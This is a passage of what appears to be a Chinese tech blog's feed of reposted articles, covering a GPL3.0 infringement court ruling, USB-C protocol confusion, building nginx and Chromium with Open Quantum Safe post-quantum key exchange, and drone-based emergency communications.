如有乐享：https://51.ruyo.net/tag/windows激活之路/ 一起活动吧：https://www.yqhd8.com/hd/865 TGSAN/CMWTAT_Digital_Edition ：https://github.com/TGSAN/CMWTAT_Digital_Edition ","link":"https://blog.gd1214b.icu/post/MpwqmHDVU/"},{"title":"首例！违反 GPL 协议致侵权，被判赔偿 50 万元","content":" 本文转自:https://www.oschina.net/news/159435 近日，一起关于 GPL 版权纠纷案裁判文书公示。一审判决书显示，GPL3.0 协议是一种民事法律行为，具有合同性质，可认定为授权人与用户间订立的著作权协议，属于我国《合同法》调整的范围。一审判定两侵权被告公司赔偿原告公司经济损失及维权合理费用共计 50 万元，并停止侵权行为。 此判例可以说是中国首个明确 GPL3.0 协议的法律效力的案例。判决书显示，明确违反开源软件许可证的侵权法律责任，一方面可以及时制止侵权行为，防止他人对开源软件的不正当利用；另一方面能够有效保护授权人的利益，使他们保有继续创作的动力，促进源代码共享和知识的传播。 不过值得注意的是，本案中被告的侵权事实成立，是因为违反 GPL3.0 协议导致 GPL3.0 协议自动解除，被告失去了 GPL3.0 协议下的源代码授权保护，进而构成侵权。 判决书中对于违反 GPL3.0 协议的侵权责任明确如下： 关于违反 GPL3.0 协议的侵权责任。 著作权法为了保护权利人的专有权，仅规定非权利人可以在如“合理使用”等范围内使用作品，诸如复制、修改、发行等权利则专属于权利人，任何人非经许可实施这些行为将构成侵权。 根据 GPL3.0 协议第 8 条“终止授权”的约定，授权人许可用户在遵守许可证规定的前提下行使某些权利，但用户必须承担相应的义务。若用户违反 GPL3.0 协议的使用条件来复制、修改或传播受保护的作品，其通过 GPL3.0 协议获得的授权将会自动终止。 对此，我国《民法总则》第一百五十八条规定：“民事法律行为可以附条件……附解除条件的民事法律行为，自条件成就时失效”。 根据开源软件的特性，GPL3.0 协议规定的使用条件(如开放源代码、标注著作权信息和修改信息等)系授权人许可用户自由使用的前提条件，亦即协议所附的解除条件。一旦用户违反了使用的前提条件，将导致 GPL3.0 协议在授权人与用户之间自动解除，用户基于协议获得的许可即时终止。用户实施的复制、修改、发布等行为，因失去权利来源而构成侵权。 案件概况 原告：济宁市罗盒网络科技有限公司 被告：福建风灵创景科技有限公司(以下简称福建风灵公司) 被告：北京风灵创景科技有限公司(以下简称北京风灵公司) （福建风灵公司系被告北京风灵公司的全资子公司） 被告：深圳市腾讯计算机系统有限公司(以下简称腾讯公司) 原告济宁市罗盒网络科技有限公司独立开发“罗盒（VirtualApp）插件化框架虚拟引擎系统 V1.0（简称 VirtualApp V1.0）。VirtualApp 从 2016 年 7 月 8 日的版本开始引入开源协议，起初为 LGPL3.0 协议，2016 年 8 月 12 日更换为 GPL3.0 协议。 2017 年 10 月 29 日，原告公司在 VirtualApp 后续开源版本中删除“适用 GPL3.0 协议”的表述。 2017 年 11 月 8 日，原告公司为 VirtualApp V1.0 取得计算机软件著作权登记证书，依法享有 VirtualApp V1.0 软件著作权的全部权利。 2017 年 12 月 30 日由 Lody（原告公司股东、VirtualApp 项目人罗迪） 提交的更新（对应 Git 码为8e6d9cd925af55b53a7e93046c469dd69676c38b）的 CHINESE.md 文件内载明“VirtualApp(中文名为罗盒)2017 年 8 月份正式公司化运作，当您需要将 VirtualApp 用于商业用途时，请务必联系 QQ1*****购买商业授权……VirtualApp 源代码将于 2017 年 12 月 31 日停止更新”。 2018 年 9 月，原告调查发现名为“点心桌面”的软件使用了 VirtualApp V1.0 的代码，将两个软件源代码进行分析比对，两者间 421 个可比代码中有 308 个代码具有实质相似性，有 27 个代码具有高度相似性，有 78 个代码具有一般相似性。因此，被诉侵权软件与涉案软件构成实质相似。 原告向法院起诉，庭审时明确诉请为判令如下： 1.被告福建风灵公司、被告北京风灵公司立即停止侵害原告的计算机软件著作权，即立即停止通过互联网提供所有版本的“点心桌面”软件的下载、安装和运营服务； 2.被告福建风灵公司、被告北京风灵公司赔偿原告经济损失 2000 万元； 3.被告福建风灵公司、被告北京风灵公司赔偿原告为制止侵权行为而支出的合理费用 50 万元; 4.被告福建风灵公司、被告北京风灵公司承担本案诉讼费用。 证据显示，被告福建风灵公司系被诉侵权软件“点心桌面”的著作权人。被告北京风灵公司亦被有关互联网平台标示为“点心桌面”的开发者，并被登记为“点心桌面”软件的著作权人。此外，提供被诉侵权软件下载、安装和运营服务的“点心桌面官网”和“应用宝”网站分别由被告福建风灵公司和腾讯公司经营。 立案之后，经查，被诉“点心桌面”App(V6.5.8)中使用了原告采用 GPL3.0 协议发布的VirtualApp，同时被告对此亦予以确认。 法院观点 法院认为，该案系侵害计算机软件著作权纠纷,涉及开源软件的相关问题。根据双方诉辩意见及举证情况，该案争议焦点有四方面。法院已就焦点问题给出明确观点。 焦点一：GPL3.0 协议的法律效力。 法院明确 GPL3.0 协议具有合同性质，可认定为授权人与用户间订立的著作权协议，属于我国《合同法》调整的范围。 关于违反 GPL3.0 协议的侵权责任，明确若用户违反 GPL3.0 协议的使用条件来复制、修改或传播受保护的作品，其通过 GPL3.0 协议获得的授权将会自动终止。 焦点二：原告是否有权提起本案诉讼。 一是根据代码托管网站上的上传记录及证明等，原告公司可以证明是 VirtualApp 的著作权人。 二是原告提起本案诉讼无需贡献者的同意或授权，即有权提起诉讼。原因包括：原告公司股东罗迪作为项目人已将 VirtualApp 初始版本的源代码共计 31097 行在 Github 网站上公开发布，此系原告主张权利的基础；本案项目人对“主分支”中 VirtualApp 源代码的形成起到了决定作用；贡献者选择在 GPL3.0 协议的 VirtualApp 项目中上传自己的源代码，贡献者亦将按照 GPL3.0 协议许可其贡献，即视为同意将贡献内容许可给项目人及其他用户使用，并且若开源项目的起诉维权需经全体贡献者一致同意或授权，实则导致维权行为无从提起。综上，原告提起本案诉讼无需贡献者的同意或授权。 三是，GPL3.0 协议中仅限制授权人不得向用户主张任何专利权，而并未限制授权人对违反许可协议的用户主张著作权。因此，原告的诉讼行为并未违反 GPL3.0 协议关于争议解决方式的约定。 焦点三：被诉行为是否侵害原告的著作权。 一是原告虽将 VirtualApp 分为开源版本与商业版本，并且在后续开源版本中删除“适用 GPL3.0 协议”的影响问题。 原告在本案中系以 VirtualApp 开源版本而非商业版本作为其权利基础，故本案中不必对VirtualApp 开源版本与商业版本的关联及影响作出认定。而根据 GPL3.0 协议，若先前版本使用了 GPL3.0 协议，则后续版本也必然受 GPL3.0 协议的约束，因此 VirtualApp 后续开源版本仍然受 GPL3.0 协议的约束。 二是 GPL3.0 协议允许用户进行商用，授权人不得对此作出限制。所以原告主张“点心桌面”App进行商用违反 GPL3.0 协议及其附加条款缺乏理据，法院不予支持。 三是被诉“点心桌面”App(V6.5.8)本应当遵循 GPL3.0 协议向公众无偿开放源代码，但被告福建风灵公司拒不履行 GPL3.0 协议规定的使用条件。根据 GPL3.0 协议第 8 条自动终止授权的约定及《民法总则》第一百五十八条的规定，被告福建风灵公司通过该协议获得的授权已因解除条件的成就而自动终止。被告福建风灵公司对 VirtualApp 实施的复制、修改、发布等行为，因失去权利来源而构成侵权。 焦点四：若侵权成立，被告应承担的法律责任。 被告福建风灵公司作为“点心桌面”App(V6.5.8)的开发、运营和发布者，依法应承担停止侵害 VirtualApp 著作权的行为。鉴于被告福建风灵公司系被告北京风灵公司的全资子公司的情形，原告指控两被告共同承担侵权责任合法有据，法院予以支持。 被告腾讯公司对其“应用宝官网”上可能存在的侵权行为制定了相关规则、设置了投诉渠道，且对被诉软件作了及时下架处理。原告亦未对被告腾讯公司提出具体诉请。因此，被告腾讯公司无需承担法律责任。 关于赔偿问题，原告主张以被告福建风灵公司、被告北京风灵公司的侵权获利来计算。鉴于开源许可协议缔约方式和缔约主体的特殊性，导致违约或侵权行为更具隐蔽性，相应法律责任的承担应有助于敦促缔约方诚信履行开源义务，确保开源社区规范、持久的发展。开源软件大多都是免费的，但授权人付出的开发成本是必然存在的，按照侵权获利来承担赔偿责任更为公平合理。 最终，法院酌情确定赔偿数额为 50 万元。原告为制止本案侵权行为所支出的合理费用，计算在赔偿损失数额范围之内。 关于此案的更多细节和法院观点，详情可登陆中国裁判文书网查看此案（2019）粤03民初3928号一审判决书。 一审判决书： https://wenshu.court.gov.cn/website/wenshu/181107ANFZ0BXSK4/index.html?docId=05f553bd178d4354bb48ad5100c1314f（中国裁判文书网地址） https://www.iphouse.cn/cases/detail/woznd0v9pek4jx35ovdj8y5gxrm371q2.html?keyword=GPL（其他网站地址） 律师解读 我们邀请专注 TMT 领域的知识产权问题的邓超律师（18611123013）就此案件做相关解读。后续邓超律师将发表深度解读文章，敬请期待！ 问题一：此案对后续有关开源软件版权纠纷案件有何具体参考意义？ 这个案子据我所知，被告上诉了，所以现在这个判决还没有生效，最后法院怎么认定，还没有最终定论。 但毫无疑问的一点是，违反许可证的义务是会遭到权利人的侵权索赔的。 因为以往国内开源主要是拿来主义，使用国外的代码比较多，但随着国内开发者的不断成熟。将来相关的纠纷会越来越多，这就要求法务和开发人员了解开源的相关问题。 问题二：为什么此案件中，“点心桌面”未被强制开源？ 没有要求强制开源是因为原告没有提出这样的要求，那么法院是一个被动的审判机关，不告不理，只被动审理原告提出的请求。 在这个案件中，原告没有选择合同，也就是许可证违约，而是选择了版权侵权这条救济途径。一般而言，版权侵权要比合同违约的救济力度要大，无论从各个方面，这在国内和在美国都是如此。 问题三：如果原告提出了开源的诉求，会如何？ 如果原告选择了合同违约这条途径，法院是不是会支持被告将代码强制开源这个问题其实很值得探讨，我个人初步的观点是，法院不一定会支持这种诉请。关于这个事情，我准备近期写篇文章，但我现在初步的看法是要求代码强制开源，在法院不太可能得到支持。 所以，如果违反 GPL 许可证的义务，那么将代码全部开源，更多的是一种理论上的可能。在实践中，以中国和美国的法院为例，我理解支持这种诉求的可能性都非常低。 ","link":"https://blog.gd1214b.icu/post/oMwynoomz/"},{"title":"唱唱反调，大一统下的 USB-C 也隐藏着「几宗罪」","content":" 本文转自:https://www.ifanr.com/1374936 大一统下 USB-C，是不一样的规格与协议带来的混乱。 USB-C 让线材规格变得极为混乱 苹果多年来未对 Lightning 接口进行重新设计，而 USB-C 形态确立之后，USB-IF 几年之间不停地在更新 USB 3.0 的协议，这让 USB-C 口具备了非常多的协议支持与极为复杂的线材选择。 这是从 Telegram 频道看来的一个「笑话」： 十年前走进商店买数据线：Micro-USB，Mini-USB，USB-A，USB-C…… 这都什么玩意 USB-IF：我们要整一个统一的接口，以后很多设备都是这个口 我：好耶 手机厂商：hAo yE！ 买数据线的我： USB-C（USB2.0），USB-C（USB3.0），USB-C（USB3.0 E-Marker），USB-C（USB3.1 Gen1 E-Marker），USB-C（USB3.1 Gen2 E-Marker），USB-C（USB3.2 Gen1 E-Marker），USB-C（USB3.2 Gen2 E-Marker），USB-C（USB3.2 Gen2×2 E-Marker），USB-C（雷电 3 E-Marker） USB-C（USB2.0 PD2.0），USB-C（USB3.0 PD2.0），USB-C（USB3.0 E-Marker PD2.0），USB-C（USB3.1 Gen1 E-Marker PD2.0），USB-C（USB3.1 Gen2 E-Marker P2.0），USB-C（USB3.2 Gen1 E-Marker PD2.0），USB-C（USB3.2 Gen2 E-Marker PD2.0），USB-C（USB3.2 Gen2×2 E-Marker PD2.0），USB-C（雷电 3 E-Marker PD2.0） USB-C（USB3.0 E-Marker PD3.0 3A），USB-C（USB3.1 Gen1 E-Marker PD3.0 3A），USB-C（USB3.1 Gen2 E-Marker P3.0 3A），USB-C（USB3.2 Gen1 E-Marker PD3.0 3A），USB-C（USB3.2 Gen2 E-Marker PD3.0 3A），USB-C（USB3.2 Gen2×2 E-Marker PD3.0 3A），USB-C（雷电 3 E-Marker PD3.0 3A） USB-C（USB3.0 E-Marker PD3.0 PPS 3A），USB-C（USB3.1 Gen1 E-Marker PD3.0 PPS 3A），USB-C（USB3.1 Gen2 E-Marker P3.0 PPS 3A），USB-C（USB3.2 Gen1 E-Marker PD3.0 PPS 3A），USB-C（USB3.2 Gen2 E-Marker PD3.0 PPS 3A），USB-C（USB3.2 Gen2×2 E-Marker PD3.0 PPS 3A），USB-C（雷电 3 E-Marker PD3.0 PPS 3A） USB-C（USB3.0 E-Marker PD3.0 5A），USB-C（USB3.1 Gen1 E-Marker PD3.0 5A），USB-C（USB3.1 Gen2 E-Marker P3.0 5A），USB-C（USB3.2 Gen1 E-Marker PD3.0 5A），USB-C（USB3.2 Gen2 E-Marker PD3.0 5A），USB-C（USB3.2 Gen2×2 E-Marker PD3.0 5A），USB-C（雷电 3 E-Marker PD3.0 5A） USB-C（USB3.0 E-Marker PD3.0 PPS 5A），USB-C（USB3.1 Gen1 E-Marker PD3.0 PPS 5A），USB-C（USB3.1 Gen2 E-Marker P3.0 PPS 5A），USB-C（USB3.2 Gen1 E-Marker PD3.0 PPS 5A），USB-C（USB3.2 Gen2 E-Marker PD3.0 PPS 5A），USB-C（USB3.2 Gen2×2 E-Marker PD3.0 PPS 5A），USB-C（雷电 3 E-Marker PD3.0 PPS 5A） USB-C（USB2.0 SuperVOOC），USB-C（USB3.0 SuperVOOC），USB-C（USB3.1 Gen1 SuperVOOC），USB-C（USB3.1 Gen2 SuperVOOC），USB-C（USB3.2 Gen1 SuperVOOC），USB-C（USB3.2 Gen2 SuperVOOC） USB-C（USB2.0 小米快充） USB-C（USB2.0 vivo22.5W 快充），USB-C（USB2.0 vivo44W 快充），USB-C（USB2.0 vivo120W 快充） USB-C（USB2.0 SCP），USB-C（USB3.0 SCP），USB-C（USB3.1 SCP），USB-C（USB3.2 Gen1 SCP），USB-C（USB3.2 Gen2 SCP） 看起来有点复杂有点好笑，但却是会真实碰到的情况。 USB-C 现在有两个问题，一个来自 USB 协议标准的制定者 USB-IF，另一个则来自 USB-C 接口本身过于流行而所支持的协议又过于丰富。 第一是 USB-IF 一直在对 USB 3.0 的标准名称乱来。比如最开始 2008 年 11 月 8 日推出的 USB 2.0 下一代标准叫做 USB 3.0，峰值速率（带宽）为 5Gbps，是 USB 2.0 时代峰值速率 480Mbps 的十倍以上。 当然，5Gbps 的速率怎么能满足 USB-IF 呢，在 USB 3.0 之后，于 2013 年 12 月 3 日正式推出了 USB 3.1，将峰值速率翻了一倍达到了 10Gbps。然后 USB-IF 的骚操作是将原先已经使用好几年的 USB 3.0 改名叫 USB 3.1 Gen1，而新推出的 10Gbps 的 USB 3.1 改名叫 USB 3.1 Gen2。 这里的操作只算是「混乱之始」，在 2017 年 USB-IF 推出了速率更快的 USB 3.2，将峰值速率推进到 20Gbps 之后，他们把在 USB 3.0/3.1 上的行为又重复了一遍。将 USB 3.1 Gen1 改名叫 USB 3.2 Gen1，USB 3.1 Gen2 改名叫 USB 3.2 Gen2，而 20Gbps 的 USB 3.2 则被命名为 USB 3.2 Gen 2×2。 新标准的推出与旧标准的接连两次改名，让许多非专业用户对 USB 3.0 标准产生了一头雾水，所以在大多数情况下用户仍然会以 USB 3.0 来统一指代 USB 3.X 的所有规格，至于实际应该如何表达连许多数码博主也感到相当头疼。 但更头疼的问题还在于 USB-C 这个接口形态支持的协议实在太多，尤其是在目前快充成为手机刚需功能之下，PD 协议、PPS 补充协议，乃至各种像 VOOC 一样的私有协议都承载在 USB-C 这个接口上。 私有协议的盛行让专用线材与产品进行身份识别达成「握手」的情况变得极为普遍，要想发挥出快充的能力，就要使用专用的电源头和专用线材。另外这些线材本身还分带不带 E-maker 芯片，能承载 3A、5A 还是 6A 电流等不同区别。 当然，也不能说手机品牌没有在减少误购方面进行努力，比如像 VOOC 一样强化充电品牌标识，在消费者进行购买的时候就比较有针对性。另外就是在接口方面使用不同颜色来作为标识。 比如小米 10 Ultra 的原装 120W 线材接口为橙色，而 OPPO Find X2 Pro 的 65W SuperVOOC 2.0 使用的则是黄色。 另外有时候也可以通过线材的粗细来进行判断，一般情况下支持更高功率的线材因为要通过更高的电流，所以线材都会比较粗，当手上有不同功率充电头和线材在一起时，用这个方法可以快捷配对。 USB-C 让接口数量整体变少，用户不得不购买扩展坞 USB-C 的「罪过」之一可能还包括「大一统」本身带来的副作用。因为像 DP 输出、快充、高速传输等等不同协议都能通过同一个 USB-C 实现，「能者多劳」似乎变得理所当然，而接口的整体数量则一直处于减少之中。 典型案例应该是苹果在 2015 年推出的 New MacBook 12，这台 MacBook 是冲着极致的轻巧便携去的，甚至采用了无风扇设计，整机的厚度只有 13.1mm，比 MacBook Air 还要再薄 24% 之多。 但趋之若鹜的消费者们随即发现了一个大问题——它只有一个 USB-C 接口。这个接口兼具了数据传输，转接有线网络和最重要的充电功能，虽然身负多种能力，但毕竟不会影分身之术，同一时间只能做一件事情。 手机品牌上其实也有类似的体现，比如当 3.5mm 耳机接口被砍掉的时候，很多品牌都顺势推出了 USB-C 接口的有线耳机。但手机的 USB 接口只有一个，在没有蓝牙耳机和无线充电的情况下，用户只能通过一个 USB-C 口在听歌和充电之中二选一。 越来越少的接口数量，还催生了比以往更大的 USB HUB 市场，这些被砍掉的接口，比如 RJ45 网线接口、HDMI 接口、SD 读卡器乃至更多的 USB-C 口，都在层出不穷的 USB HUB 上还了回来。 USB-C 让产品的协议支持变得极为难以查询 在以前，由于各个接口的形状并不相同，只要看到笔记本的渲染图就能得知其在接口上的大致扩展性如何，比如 RJ45 接口、3.5mm 接口、HDMI 接口等等。在 USB Type-A 接口的后期，还曾用颜色来区别 USB 2.0 和 USB 3.0 的接口，USB 3.0 的规范建议 USB 3.0 接口基座使用一部分蓝色，以方便用户快速区分。 而现在一眼望过去只有几个长相一模一样的 USB-C 口。 就像上面所说，即便是同一个产品上看上去完全相同 USB-C 口，其实际承载的功能也可能是完全不一样的。 拿最近的一台产品，TNT GO 无线版来举例，在机身右侧下部共有两个 USB-C 接口，他们从形态上看上去完全一样，但是在实际使用中，只能通过上面的接口进行有线连接 TNT，并不能混用，而坚果团队也在靠下的那个 USB-C 口上标注了闪电形状的小图标来表示这个接口用于充电。 在笔记本产品中也有类似现象，并且多发生在需要平衡价格与性能的中端产品之上。比如同事在使用的 2018 款联想小新，虽然具备 USB-C 接口但并不能用来充电，充电依然需要 DC 电源口，2018 年时已经有不少高功率 PD 充电器流行，非常影响笔记本的出行便携性。 电源还算是比较显而易见的功能，如果是更加具备隐蔽性的功能，那可能单纯从接口上是看不出来的，比如说 DP 视频输出功能某些 USB-C 口就是不具备的，而如果具备多个 USB-C 口，很可能需要仔细查阅技术支持文档才能在搞清楚支持情况，由此也诞生出了「全功能 USB-C 口」的说法。 另外有的 USB-C 还支持英特尔的 Thunderbolt3（雷雳 3 接口，俗称雷电口）协议标准，能够将传输带宽相比 USB 3.2 2×2 的基础上再次翻倍达到 40Gbps，实际上已经公布的 USB4 标准就是建立在 Thunderbolt3 的基础上而来。 而在带宽达到 40Gbps 的之后，不仅能外接更多更高分辨率的显示器，还能够使用 eGPU 这样的外置显卡来进一步提升显示性能，扩展能力相比 USB 3.2 再次增强。而从外观上来说，它依旧是一个普通的 USB-C。 不求放弃私有协议，但求更清晰明确的标识 首先从结论上说，我并没有反对 USB-C 对繁杂的接口进行统一整合，USB-C 即便混乱，但依然提供了比以往更强大的兼容性，从这一点上来说是非常正面的。但这些「副作用」也是确实存在，并且可能需要厂商去推动更好的解决方法。 比如用插头上用不同颜色，比如在笔记本的 USB-C 口旁边用小图标进行更详细的标准，像是为 Thunderbolt3 准备了小小的雷电标识，都在一定程度上起到了效果，但可能还需要更巧妙，更明显。 强扭的瓜不甜，但愿以后 USB-C 的线材和基座的配对之间能再更清晰明了有些，不再 65W SuperVOOC 惨变 15W PD，视频输出展示 PPT 显示黑屏，Switch 接上显示器没反应。 ","link":"https://blog.gd1214b.icu/post/DPiU4ip0y/"},{"title":"未雨绸缪：使用后量子时代的加密算法","content":" 本文转自: https://lantian.pub/article/modify-website/post-quantum-encryption.lantian/ 现代互联网上，绝大多数网站都已经支持 HTTPS，其使用的 SSL/TLS 加密协议会将用户的请求数据与网站的响应进行加密，以防止信息被路径上的恶意用户窃取或篡改。而 SSL/TLS 协议中的一个重要组成部分是 RSA、ECDSA 等非对称加密算法，这些算法的密钥分为公钥、私钥两份，公钥可以公开，而私钥则要妥善保管。 在访问 HTTPS 网站时，会经过以下的流程： 网站会将它的公钥（以证书形式）发送给浏览器。 浏览器会校验公钥的有效性，防止中间人篡改公钥，从而拦截或监听通信。 浏览器（或操作系统）内置了一组可信任的证书颁发机构（CA）的公钥，通过密码学方法可以确认这份公钥是其中某个颁发机构生成的。 证书颁发机构则会通过一系列方法（多级证书链，物理隔绝的密钥保存设备）来保护他们自己的私钥安全，防止有人窃取他们的私钥来随意生成被信任的证书信息。 浏览器会与证书颁发机构的服务器联系，查询 “证书吊销列表”（Certificate Revocation List）。这个列表保存了所有的 “虽然的确是证书颁发机构颁发，但是因为系统错误 / 私钥泄漏等原因不能再被信任” 的证书。 浏览器在确定公钥可信后，本地随机产生一个随机密钥，用来加密这一次的连接。 浏览器将随机密钥用网站的公钥加密，然后发送给网站服务器。 加密后的内容只能用网站的私钥解密，不能用公钥解密，因此监听者是无法获取随机密钥内容的。 网站服务器用本地保存的私钥解密内容，获得浏览器产生的随机密钥。 浏览器和网站服务器开始用解密后的随机密钥进行对称加密，也就是双方使用同一份密码进行加密 / 解密的加密算法，例如 AES。 这里不再使用非对称加密是因为非对称加密对算力的消耗较大，而对称加密性能较高。 非对称加密算法保证了浏览器和网站交换对称加密密钥的安全，从而保证数据不被窃取或篡改。 但是随着量子计算机的诞生，事情发生了一点变化。在量子计算机上运行的秀尔算法可以非常高效地破解 RSA、ECDSA 等基于质因数分解难度的传统非对称加密算法，只要有一台足够强大的量子计算机，也就是量子比特数目达标的计算机。 而随着量子计算的逐渐火热，量子计算机正在迅速地发展。目前公开的最强大的量子计算机是 IBM 的 53 量子比特计算机（参见量子霸权），仍然不够使用秀尔算法破解 RSA、ECDSA 等，但高速的科技发展随时可能将此变成现实。 因此，密码学家们着手开发无法被量子计算机有效破解的非对称加密算法，并推广它们的使用，以准备好迎接 RSA 被破解的那一天。 从 2016 年末开始，Open Quantum Safe 项目就开始将现有的、能抵抗量子计算机的加密算法整合到 liboqs 开发库里，并将它集成到 OpenSSL、BoringSSL 等广泛使用的加密库，以简化新加密算法的部署。 同时，官方还提供了 nginx、Chromium 等软件的编译、集成流程文档。因此，只需要参照文档进行简单的修改，我们就可以准备好迎接实用量子计算机的到来。 注意：这里所有的后量子加密算法都相对较新，并且正在进行 NIST 的标准化审核流程，可能仍有未被发现的漏洞。虽然 Open Quantum Safe 项目有一些方法降低风险，但在这些算法的标准化流程完成之前，不建议将它们用于生产环境等重要用途。 nginx / OpenSSL 由于 nginx 使用 OpenSSL 或 BoringSSL 作为自己的加密库，我们不需要对 nginx 做任何修改，只需要把 OpenSSL 替换成 Open Quantum Safe 项目的版本就可以。 Open Quantum Safe 提供了一份修改后的 Dockerfile，可以用作参考。 相比编译普通的 nginx，主要的改动有两处： 需要使用 Open Quantum Safe 的 OpenSSL，并额外下载、编译 liboqs，将其安装到 OpenSSL 的源码目录，以便调用。我的 Dockerfile 中与之相关的是 44-52 行： # 前略 &amp;&amp; git clone -b OQS-OpenSSL_1_1_1-stable https://github.com/open-quantum-safe/openssl.git \\ # 省略了一些我个人使用的 OpenSSL 修改，对后量子加密不是必要的 &amp;&amp; git clone -b master https://github.com/open-quantum-safe/liboqs.git \\ &amp;&amp; mkdir /tmp/liboqs/build &amp;&amp; cd /tmp/liboqs/build \\ &amp;&amp; cmake -DOQS_BUILD_ONLY_LIB=1 -DBUILD_SHARED_LIBS=OFF -DCMAKE_INSTALL_PREFIX=/tmp/openssl/oqs .. \\ &amp;&amp; make -j4 &amp;&amp; make install &amp;&amp; cd /tmp \\ # 后略 其中所有文件都被下载到了 /tmp 目录下。关键点是用 cmake 编译 liboqs 项目，并将其安装到 OpenSSL 源码目录的 oqs 子目录下。 2. 需要额外添加一些编译参数，以将 liboqs 包含在编译出来的 nginx 中，在 Dockerfile 的 102-104 行： # 前略 &amp;&amp; ./configure \\ # 略过一些 nginx 的编译参数 --with-openssl=/tmp/openssl \\ --with-cc-opt=&quot;-I/tmp/openssl/oqs/include&quot; \\ --with-ld-opt=&quot;-L/tmp/openssl/oqs/lib&quot; \\ &amp;&amp; sed -i 's/libcrypto.a/libcrypto.a -loqs/g' objs/Makefile \\ # 后略 然后正常编译 nginx 即可。 编译、安装 nginx 完成后，还需要修改参数使用这些后量子时代的非对称加密算法，包括密钥交换算法和身份验证算法两类： 密钥交换算法：即浏览器和网站传输对称加密密钥时使用的非对称加密算法。 只需简单修改 nginx.conf 中的 ssl_ecdh_curve 参数，使用这些非对称加密算法的椭圆曲线，就可以使用这些密钥交换算法： ssl_ecdh_curve 'p256_frodo640aes:p256_bike1l1cpa:p256_kyber90s512:p256_ntru_hps2048509:p256_lightsaber:p256_sidhp434:p256_sikep434:prime256v1:secp384r1:secp521r1'; 修改完成后 nginx -s reload 即可。 这里只开启了支持的密钥交换算法的一部分，原因有二： nginx 对这一参数的长度有限制，过长会报错； 选择的这些参数也都被 Open Quantum Safe 的 BoringSSL 支持，这在后续开启 Chromium 支持时至关重要。 同时，这些密钥交换算法都以 p256_ 开头，意味着后量子加密算法和传统加密算法同时使用。这是为了防止一种情况：新的加密算法存在数学漏洞，使得它们使用传统计算机（冯诺依曼计算机）就可以快速破解。同时使用两种交换算法，既保证了无法被量子计算机破解（如果新加密算法正常工作），也保证了一旦新加密算法被破解，密钥交换数据仍然拥有与传统算法同等级别的保护，不会被传统计算机立即破解。 身份验证算法：即证书颁发机构（CA）给网站颁发证书形式公私钥的算法。使用这些算法需要找支持后量子算法的 CA（现在还不存在）重新签发证书，或者自己签发证书（不被浏览器信任），都不实用，因此我选择现在不使用。 在这里配置完后，你可以使用 Open Quantum Safe 的一个 curl Docker 镜像来测试一下你的网站： # 将最后一个参数替换成你要用的加密算法，格式和 ssl_ecdh_curve 相同 docker run -it openquantumsafe/curl:0.4.0 curl https://lantian.pub --curves p256_frodo640aes Chromium / BoringSSL 虽然有了命令行的 curl 验证，但是一个全功能的浏览器的支持能够让后量子加密实用化，给用户更佳的保护。Open Quantum Safe 同样提供了修改后的 BoringSSL，只需要将它编译到 Chromium 里，就可以在目前世界上最流行的浏览器中体验后量子加密算法了。 Open Quantum Safe 同样提供了 Chromium 的编译教程。与编译原版 Chromium 相比，主要不同的步骤有四处： git clone https://github.com/open-quantum-safe/boringssl，用修改过的 BoringSSL 替换 Chromium 源代码中 third_party/boringssl/src 路径下的原版 BoringSSL； 下载 liboqs，编译安装到 BoringSSL 的 oqs 目录下： git clone --branch master https://github.com/open-quantum-safe/liboqs.git cd liboqs &amp;&amp; mkdir build &amp;&amp; cd build cmake .. -G&quot;Ninja&quot; -DCMAKE_INSTALL_PREFIX=&lt;CHROMIUM_ROOT&gt;/third_party/boringssl/src/oqs -DOQS_USE_OPENSSL=OFF ninja &amp;&amp; ninja install 给 Chromium 打上调用 liboqs 的补丁。 在 third_party/boringssl 文件夹下运行 python2 src/util/generate_build_files.py gn 以更新依赖，加入 liboqs 相关内容。 之后按照正常步骤编译 Chromium 即可。 编译、安装完成后，启动 Chromium 访问开启了后量子加密的网站，然后打开开发者工具的 Security（安全）面板： 上面已经显示使用了 p256_frodo640aes 算法，也就意味着你的网页浏览已经有了后量子时代的保护。 额外要注意的是，Open Quantum Safe 的 BoringSSL 只支持一小部分的密钥交换算法： P256_BIKE1L1CPA, P256_FRODO640AES, P256_KYBER90S512, P256_NTRU_HPS2048509, P256_LIGHTSABER, P256_SIDHP434, P256_SIKEP434 这一列表只在官方测试站上提到。因此我先前选择了这些算法配置在 nginx 中。 ","link":"https://blog.gd1214b.icu/post/kyFI8q8Or/"},{"title":"作为一名通信老司机，我是如何看待翼龙通信无人机救灾的？","content":" 本文转自:https://mp.weixin.qq.com/s/pciazhEWr81A6XzA8CVQ6g 昨天，关于翼龙无人机救灾的新闻，刷屏了整个网络。 由国家应急管理部紧急调派的翼龙-2H应急救灾型无人机，搭载中国移动的基站设备，从贵州安顺出发，连续出动两次，分别赶赴河南省巩义市米河镇以及郑州市中牟县阜外华中心血管病医院，执行应急通信网络保障任务。 今天赶个晚集，刚好写点更有深度的内容，分析一下这个事件的前前后后。 无人机通信的技术利弊 赞美的话我就不说了，直接看技术。 无人机通信，严格来说分为两种。一种是为了实现无人机飞行控制而进行的通信（例如无人机表演），另一种是指利用无人机提供区域内的通信保障服务。我们今天讲的，主要是后者，姑且称为无人机通信保障。 其实，无人机通信保障，并不是什么新鲜事物。 2008年汶川地震发生的时候，地面基站微波线缆等通信设备几乎全毁，导致灾区彻底失联。当时，空军派出了15名空降兵勇士，携带2部海事卫星电话，冒险跳伞进入灾区，才算恢复了联系。 灾后，通信及应急管理等有关部门汲取经验教训，重点加强了应急通信保障能力的建设。随着无人机技术的成熟和普及，无人机基站应急通信也成为了一个热门的研究方向，吸引了不少学者进行研究，也有了一些成果。 2017年九寨沟发生地震后，中国移动紧急调运了一套无人机高空基站，连夜送达地震灾区，用于恢复周边30多平方公里受灾区域的手机信号。这是国内无人机高空基站在地震救灾中的首次应用，当时也引起了不小的轰动。 需要注意的是，在这次翼龙-2H应急救灾型无人机出现之前，我们看到的几乎所有无人机高空基站，都属于旋翼无人机。 它们的特点是运输方便，起降和操控（相对）容易，可以空中悬停。缺点也很明显：飞行高度和移动范围有限，且受限于电池续航能力，留空时间较短。 有些旋翼无人机的下方，会有一根线缆与地面相连，进行数据回传或者提供电力。这种无人机，也称为系留式无人机。 这次出现的翼龙-2H应急救灾型无人机，之所以引起轰动，其中一个主要的原因，就是它是首次将固定翼无人机应用于应急通信保障任务。 相比旋翼无人机，这种固定翼无人机飞行高度高，飞行距离远，覆盖范围大，优势明显。 不过，因为和地面之间没有有线连接，所以它只能通过无线回传的方式，建立与核心网设备之间的联系。 